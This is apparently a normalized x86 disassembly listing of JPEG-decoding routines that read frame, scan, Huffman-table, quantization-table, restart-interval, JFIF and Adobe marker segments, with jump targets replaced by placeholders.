call [ ecx + 0x4 ]
mov eax [ ebx + 0x1b8 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
jbe r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x3a
mov edx [ eax ]
call [ edx ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x20
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x1c ] 0x0
jbe r-xdata
cmp [ ebx + 0xd8 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xb
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x24 ] 0x0
jg r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov ebp [ ebx + 0xd8 ]
jmp r-xdata
mov ecx [ ebx + 0x24 ]
mov edx 0x1
mov eax ecx
lea ecx [ eax + ecx * 4 ]
lea ecx [ eax + ecx * 4 ]
mov eax ebx
shl ecx 0x2
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ ebx + 0xd8 ] eax
mov ecx [ ebx + 0x24 ]
lea ecx [ ecx + ecx * 2 ]
cmp ebp ecx
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x24 ]
jl r-xdata
mov eax [ esp + 0x8 ]
test edi edi
mov [ ebp + 0x4 ] eax
jne r-xdata
mov edx [ ebx + 0x1b8 ]
mov [ edx + 0x10 ] 0x1
mov ecx [ esp + 0xc ]
mov [ ecx ] esi
mov eax [ esp + 0xc ]
mov [ eax + 0x4 ] edi
mov eax 0x1
dec edi
xor eax eax
mov al [ esi ]
mov [ ebp ] eax
inc esi
test edi edi
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
mov edx eax
and eax 0xf
sar edx 0x4
and edx 0xf
test edi edi
mov [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] eax
jne r-xdata
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
mov [ ebp + 0x10 ] eax
mov eax [ ebx ]
add eax 0x18
mov edx [ ebp ]
mov [ eax ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0xc ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x65
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
inc [ esp + 0x8 ]
add ebp 0x54
mov esi [ esp + 0xc ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
sub_495d24
push ebx
push esi
push edi
push ebp
mov ebx eax
add esp 0xffffffe8
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov eax [ ebx + 0x1b8 ]
mov edi [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
test ebp ebp
jne r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x3e
mov edx [ eax ]
call [ edx ]
dec ebp
movzx esi [ edi ]
shl esi 0x8
inc edi
test ebp ebp
jne r-xdata
mov esi [ esp + 0x10 ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
dec ebp
xor eax eax
mov al [ edi ]
add esi eax
inc edi
test ebp ebp
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax ebx
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x4 ] eax
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x67
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
add eax eax
add eax 0x6
cmp esi eax
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax ebx
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0xb
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0x1
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
cmp [ esp + 0x4 ] 0x4
jle r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x8 ] eax
test ebp ebp
mov edx [ esp + 0x8 ]
mov [ ebx + 0x190 ] edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
dec ebp
xor eax eax
mov al [ edi ]
mov [ esp + 0xc ] eax
inc edi
test ebp ebp
jne r-xdata
mov esi [ esp + 0x10 ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ ebx + 0x148 ] ecx
xor eax eax
mov [ esp ] eax
lea edx [ ebx + 0x14c ]
mov [ esp + 0x14 ] edx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x8 ] eax
test ebp ebp
mov edx [ esp + 0x8 ]
mov [ ebx + 0x194 ] edx
jne r-xdata
mov esi [ esp + 0x10 ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
mov [ esp + 0x8 ] eax
xor eax eax
mov esi [ ebx + 0xd8 ]
jmp r-xdata
mov esi [ esp + 0x10 ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
dec ebp
xor eax eax
mov al [ edi ]
mov [ esp + 0x8 ] eax
inc edi
mov edx [ esp + 0x8 ]
sar edx 0x4
and edx 0xf
mov [ ebx + 0x198 ] edx
mov ecx [ esp + 0x8 ]
and ecx 0xf
mov [ ebx + 0x19c ] ecx
mov eax [ ebx ]
add eax 0x18
mov edx [ ebx + 0x190 ]
mov [ eax ] edx
mov ecx [ ebx + 0x194 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebx + 0x198 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebx + 0x19c ]
mov [ eax + 0xc ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x69
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebx + 0x1b8 ]
xor edx edx
mov [ eax + 0x14 ] edx
inc [ ebx + 0x90 ]
mov ecx [ esp + 0x10 ]
mov [ ecx ] edi
mov eax [ esp + 0x10 ]
mov [ eax + 0x4 ] ebp
mov eax 0x1
mov esi [ esp + 0x10 ]
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
cmp eax [ ebx + 0x24 ]
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ebp [ eax + 0x4 ]
mov edi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0xc ]
cmp edx [ esi ]
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x5
mov ecx [ esp + 0xc ]
mov [ eax + 0x18 ] ecx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] esi
mov eax [ esp + 0x8 ]
sar eax 0x4
and eax 0xf
mov [ esi + 0x14 ] eax
mov edx [ esp + 0x8 ]
and edx 0xf
mov [ esi + 0x18 ] edx
mov eax [ ebx ]
add eax 0x18
mov edx [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x18 ]
mov [ eax + 0x8 ] edx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x68
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
inc [ esp ]
add [ esp + 0x14 ] 0x4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jl r-xdata
inc eax
add esi 0x54
sub_496064
push ebx
push esi
push edi
push ebp
mov edi eax
add esp 0xfffffed4
mov eax [ edi + 0x18 ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0xc ]
mov edx [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
test esi esi
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp ] eax
jne r-xdata
mov ebx [ esp + 0xc ]
mov eax edi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
dec esi
xor eax eax
mov al [ ebx ]
add [ esp ] eax
inc ebx
sub [ esp ] 0x2
cmp [ esp ] 0x10
jle r-xdata
mov ebx [ esp + 0xc ]
mov eax edi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
add esp 0x12c
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0xc ]
mov [ ecx ] ebx
mov eax [ esp + 0xc ]
mov [ eax + 0x4 ] esi
mov eax 0x1
mov ecx [ edi ]
mov eax edi
mov [ ecx + 0x14 ] 0xb
mov edx [ eax ]
call [ edx ]
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
mov [ esp + 0x4 ] eax
mov eax [ edi ]
mov [ eax + 0x14 ] 0x50
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ esp + 0x18 ] 0x0
xor eax eax
mov ebp 0x1
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x19 ]
mov [ esp + 0x10 ] eax
mov ebx [ esp + 0xc ]
mov eax edi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov al [ ebx ]
xor ecx ecx
inc ebx
mov cl al
mov [ edx ] al
add [ esp + 0x8 ] ecx
inc [ esp + 0x10 ]
dec esi
inc ebp
cmp ebp 0x10
jle r-xdata
mov ebx [ esp + 0xc ]
mov eax edi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
sub [ esp ] 0x11
mov eax [ edi ]
add eax 0x18
xor edx edx
mov dl [ esp + 0x19 ]
mov [ eax ] edx
xor ecx ecx
mov cl [ esp + 0x1a ]
mov [ eax + 0x4 ] ecx
xor edx edx
mov dl [ esp + 0x1b ]
mov [ eax + 0x8 ] edx
xor ecx ecx
mov cl [ esp + 0x1c ]
mov [ eax + 0xc ] ecx
xor edx edx
mov dl [ esp + 0x1d ]
mov [ eax + 0x10 ] edx
xor ecx ecx
mov cl [ esp + 0x1e ]
mov [ eax + 0x14 ] ecx
xor edx edx
mov dl [ esp + 0x1f ]
mov [ eax + 0x18 ] edx
xor ecx ecx
mov cl [ esp + 0x20 ]
mov [ eax + 0x1c ] ecx
mov eax [ edi ]
mov [ eax + 0x14 ] 0x56
mov edx 0x2
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ edi ]
add eax 0x18
xor edx edx
mov dl [ esp + 0x21 ]
mov [ eax ] edx
xor ecx ecx
mov cl [ esp + 0x22 ]
mov [ eax + 0x4 ] ecx
xor edx edx
mov dl [ esp + 0x23 ]
mov [ eax + 0x8 ] edx
xor ecx ecx
mov cl [ esp + 0x24 ]
mov [ eax + 0xc ] ecx
xor edx edx
mov dl [ esp + 0x25 ]
mov [ eax + 0x10 ] edx
xor ecx ecx
mov cl [ esp + 0x26 ]
mov [ eax + 0x14 ] ecx
xor edx edx
mov dl [ esp + 0x27 ]
mov [ eax + 0x18 ] edx
xor ecx ecx
mov cl [ esp + 0x28 ]
mov [ eax + 0x1c ] ecx
mov eax [ edi ]
mov [ eax + 0x14 ] 0x56
mov edx 0x2
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp [ esp + 0x8 ] 0x100
jg r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
mov edx [ edi ]
mov eax edi
mov [ edx + 0x14 ] 0x8
mov edx [ eax ]
call [ edx ]
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jle r-xdata
mov ecx [ esp + 0x8 ]
sub [ esp ] ecx
test [ esp + 0x4 ] 0x10
je r-xdata
test esi esi
jne r-xdata
xor ebp ebp
lea eax [ esp + 0x2c ]
mov [ esp + 0x14 ] eax
cmp ebp [ esp + 0x8 ]
jge r-xdata
mov ebp [ esp + 0x4 ]
shl ebp 0x2
add ebp edi
add ebp 0xb4
sub [ esp + 0x4 ] 0x10
mov ebp [ esp + 0x4 ]
shl ebp 0x2
add ebp edi
add ebp 0xc4
jmp r-xdata
dec esi
mov eax [ esp + 0x14 ]
mov dl [ ebx ]
mov [ eax ] dl
inc ebx
inc ebp
inc [ esp + 0x14 ]
cmp ebp [ esp + 0x8 ]
jl r-xdata
mov ebx [ esp + 0xc ]
mov eax edi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov [ eax + 0x14 ] 0x1e
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0x4
jl r-xdata
cmp [ esp + 0x4 ] 0x0
jl r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov esi [ eax + 0x4 ]
mov ebx [ edx ]
xor eax eax
jmp r-xdata
push 0x11
lea edx [ esp + 0x1c ]
push edx
mov ecx [ ebp ]
push ecx
call sub_48ab50
add esp 0xc
push 0x100
lea eax [ esp + 0x30 ]
push eax
mov edx [ ebp ]
add edx 0x11
push edx
call sub_48ab50
add esp 0xc
cmp [ esp ] 0x10
jg r-xdata
mov eax edi
call sub_497854
mov [ ebp ] eax
cmp [ ebp ] 0x0
jne r-xdata
sub_496398
push ebx
push esi
push edi
push ebp
mov ebp eax
add esp 0xffffffe8
mov eax [ ebp + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
test edi edi
jne r-xdata
xor eax eax
dec edi
mov al [ esi ]
inc esi
shl eax 0x8
test edi edi
mov [ esp ] eax
jne r-xdata
mov ebx [ esp + 0x10 ]
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
add [ esp ] eax
inc esi
sub [ esp ] 0x2
cmp [ esp ] 0x0
jle r-xdata
mov ebx [ esp + 0x10 ]
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x10 ]
mov [ ecx ] esi
mov eax [ esp + 0x10 ]
mov [ eax + 0x4 ] edi
mov eax 0x1
mov eax [ ebp ]
mov [ eax + 0x14 ] 0xb
mov eax ebp
mov edx [ eax ]
call [ edx ]
xor ebx ebx
dec edi
mov bl [ esi ]
inc esi
mov eax ebx
sar eax 0x4
and ebx 0xf
mov [ esp + 0x8 ] eax
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x51
mov [ eax + 0x18 ] ebx
mov edx [ esp + 0x8 ]
mov [ eax + 0x1c ] edx
mov eax ebp
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp ebx 0x4
jl r-xdata
mov ebx [ esp + 0x10 ]
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
cmp [ ebp + ebx * 4 + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x1f
mov [ eax + 0x18 ] ebx
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov edx [ ebp + ebx * 4 + 0xa4 ]
xor ecx ecx
mov [ esp + 0xc ] edx
mov [ esp + 0x4 ] ecx
mov [ esp + 0x14 ] rw-data
mov eax ebp
call sub_49783c
mov [ ebp + ebx * 4 + 0xa4 ] eax
test edi edi
jne r-xdata
test edi edi
jne r-xdata
dec edi
xor ebx ebx
mov bl [ esi ]
inc esi
mov ebx [ esp + 0x10 ]
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor ebx ebx
mov bl [ esi ]
shl ebx 0x8
inc esi
test edi edi
jne r-xdata
mov ebx [ esp + 0x10 ]
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp ]
cmp [ eax + 0x68 ] 0x2
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
dec edi
xor eax eax
mov al [ esi ]
add ebx eax
inc esi
jmp r-xdata
mov esi [ esp + 0x10 ]
mov eax ebp
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
sub [ esp ] 0x41
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov ecx [ esp + 0xc ]
mov ebx ecx
mov eax [ esp + 0x14 ]
mov edx [ eax ]
mov ecx [ esp + 0xc ]
mov [ ecx + edx * 2 ] bx
inc [ esp + 0x4 ]
add [ esp + 0x14 ] 0x4
cmp [ esp + 0x4 ] 0x40
jl r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov edi [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x0
jg r-xdata
sub [ esp ] 0x40
mov eax [ ebp ]
add eax 0x18
movzx edx [ ebx ]
mov [ eax ] edx
movzx ecx [ ebx + 0x2 ]
mov [ eax + 0x4 ] ecx
movzx edx [ ebx + 0x4 ]
mov [ eax + 0x8 ] edx
movzx ecx [ ebx + 0x6 ]
mov [ eax + 0xc ] ecx
movzx edx [ ebx + 0x8 ]
mov [ eax + 0x10 ] edx
movzx ecx [ ebx + 0xa ]
mov [ eax + 0x14 ] ecx
movzx edx [ ebx + 0xc ]
mov [ eax + 0x18 ] edx
movzx ecx [ ebx + 0xe ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x5d
mov edx 0x2
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x4 ]
add [ esp + 0x4 ] 0x8
add ebx 0x10
cmp [ esp + 0x4 ] 0x40
jl r-xdata
sub_496634
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov edi [ ebp + 0x18 ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp ] eax
jne r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
dec esi
xor eax eax
mov al [ ebx ]
add [ esp ] eax
inc ebx
cmp [ esp ] 0x4
je r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
mov edx [ ebp ]
mov eax ebp
mov [ edx + 0x14 ] 0xb
mov edx [ eax ]
call [ edx ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp + 0x4 ] eax
jne r-xdata
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
add [ esp + 0x4 ] eax
inc ebx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x52
mov edx [ esp + 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebp
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
mov [ ebp + 0x114 ] eax
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
mov eax 0x1
mov eax ebp
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
sub_496720
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov edi [ ebp - 0x4 ]
add edi [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] 0xe
jb r-xdata
cmp [ ebp - 0x4 ] 0x6
jb r-xdata
cmp [ ebx ] 0x4a
jne r-xdata
mov eax [ esi ]
mov edx 0x1
mov [ eax + 0x14 ] 0x4d
mov [ eax + 0x18 ] edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp [ ebx ] 0x4a
jne r-xdata
cmp [ ebx + 0x1 ] 0x46
jne r-xdata
cmp [ ebx + 0x1 ] 0x46
jne r-xdata
cmp [ ebx + 0x2 ] 0x49
jne r-xdata
cmp [ ebx + 0x2 ] 0x58
jne r-xdata
cmp [ ebx + 0x3 ] 0x46
jne r-xdata
cmp [ ebx + 0x3 ] 0x58
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ esi + 0x118 ] 0x1
mov al [ ebx + 0x5 ]
mov [ esi + 0x11c ] al
xor eax eax
mov dl [ ebx + 0x6 ]
mov [ esi + 0x11d ] dl
xor edx edx
mov cl [ ebx + 0x7 ]
mov [ esi + 0x11e ] cl
xor ecx ecx
mov al [ ebx + 0x8 ]
mov dl [ ebx + 0x9 ]
shl eax 0x8
add ax dx
mov [ esi + 0x120 ] ax
xor eax eax
mov cl [ ebx + 0xa ]
mov al [ ebx + 0xb ]
shl ecx 0x8
add cx ax
mov [ esi + 0x122 ] cx
cmp [ esi + 0x11c ] 0x1
je r-xdata
mov dl [ ebx + 0x5 ]
sub dl 0x10
je r-xdata
mov eax [ esi ]
add eax 0x18
xor edx edx
mov dl [ esi + 0x11c ]
mov [ eax ] edx
xor ecx ecx
mov cl [ esi + 0x11d ]
mov [ eax + 0x4 ] ecx
movzx edx [ esi + 0x120 ]
mov [ eax + 0x8 ] edx
movzx ecx [ esi + 0x122 ]
mov [ eax + 0xc ] ecx
xor edx edx
mov dl [ esi + 0x11e ]
mov [ eax + 0x10 ] edx
mov eax [ esi ]
mov [ eax + 0x14 ] 0x57
mov edx 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov al [ ebx + 0xc ]
or al [ ebx + 0xd ]
je r-xdata
mov eax [ esi ]
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] 0x77
mov dl [ esi + 0x11c ]
mov [ eax + 0x18 ] edx
or edx 0xffffffff
mov cl [ esi + 0x11d ]
mov [ eax + 0x1c ] ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esi ]
mov edx 0x1
mov [ eax + 0x14 ] 0x6c
mov [ eax + 0x18 ] edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
dec dl
je r-xdata
xor eax eax
xor edx edx
mov dl [ ebx + 0xd ]
mov al [ ebx + 0xc ]
imul edx
sub edi 0xe
lea ecx [ eax + eax * 2 ]
cmp edi ecx
je r-xdata
mov eax [ esi ]
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] 0x5a
mov dl [ ebx + 0xc ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov cl [ ebx + 0xd ]
mov [ eax + 0x1c ] ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ esi ]
mov edx 0x1
mov [ eax + 0x14 ] 0x6d
mov [ eax + 0x18 ] edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
sub dl 0x2
je r-xdata
mov eax [ esi ]
mov edx 0x1
mov [ eax + 0x14 ] 0x58
mov [ eax + 0x18 ] edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
mov eax [ esi ]
mov edx 0x1
mov [ eax + 0x14 ] 0x6e
mov [ eax + 0x18 ] edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] 0x59
mov dl [ ebx + 0x5 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edi
mov eax esi
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
sub_496984
push ebp
mov ebp esp
add esp 0xfffffff4
cmp ecx 0xc
push ebx
mov ebx eax
push esi
jb r-xdata
mov eax [ ebx ]
mov edx 0x1
mov [ eax + 0x14 ] 0x4e
add ecx [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp [ edx ] 0x41
jne r-xdata
cmp [ edx + 0x1 ] 0x64
jne r-xdata
cmp [ edx + 0x2 ] 0x6f
jne r-xdata
cmp [ edx + 0x3 ] 0x62
jne r-xdata
cmp [ edx + 0x4 ] 0x65
jne r-xdata
xor eax eax
xor ecx ecx
mov al [ edx + 0x5 ]
mov cl [ edx + 0x6 ]
shl eax 0x8
add eax ecx
xor ecx ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov al [ edx + 0x7 ]
mov cl [ edx + 0x8 ]
shl eax 0x8
add eax ecx
xor ecx ecx
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ edx + 0x9 ]
mov cl [ edx + 0xa ]
shl eax 0x8
add eax ecx
mov [ ebp - 0xc ] eax
movzx esi [ edx + 0xb ]
mov eax [ ebx ]
add eax 0x18
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
mov edx [ ebp - 0xc ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] esi
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x4c
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x124 ] 0x1
mov eax esi
